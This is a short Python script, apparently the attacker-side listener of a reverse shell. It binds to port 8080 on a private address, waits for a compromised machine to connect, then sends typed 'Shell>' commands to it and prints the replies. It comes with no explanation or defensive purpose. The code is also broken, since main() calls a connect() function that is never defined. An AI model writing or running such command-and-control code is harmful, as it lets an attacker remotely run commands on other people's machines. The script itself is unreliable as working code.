import socket
#  Test if its running netstat -antp | grep 8080
#  on windows netstat -ano
s = socket.socket()
s.bind(("10.174.15.6", 8080))
s.listen(1)
conn, addr = s.accept()
print ("[+] We got a connection from",addr)
    
while True:
        command = input("Shell>")
        if "terminate" in command:
            conn.send("terminate".encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print (conn.recv(1024).decode())
def main ():
    connect()
    
main()
    